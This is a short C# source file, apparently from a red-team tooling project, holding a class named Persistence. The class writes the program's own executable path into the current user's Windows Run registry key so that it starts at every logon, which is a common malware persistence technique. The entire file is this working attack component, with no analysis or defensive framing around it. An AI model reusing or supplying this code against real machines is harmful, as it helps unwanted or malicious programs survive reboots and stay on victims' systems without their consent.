using System;


namespace RedTeamDevelop
{
    class Persistence
    {
        GeneralInfo newInstance;
        public void AddtoStartup(){
            
           //before using this must be run using dotnet add package Microsoft.Win32.Registry
           Microsoft.Win32.RegistryKey rkInstance = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run",true);
            rkInstance.SetValue("RedTeamDevelop", newInstance.ePath);
            rkInstance.Dispose();
            rkInstance.Close();

        }

        //constructor takes GeneralInfo object as argument
        public Persistence(GeneralInfo newInstance){
            this.newInstance = newInstance;
        }
              
    }
    
}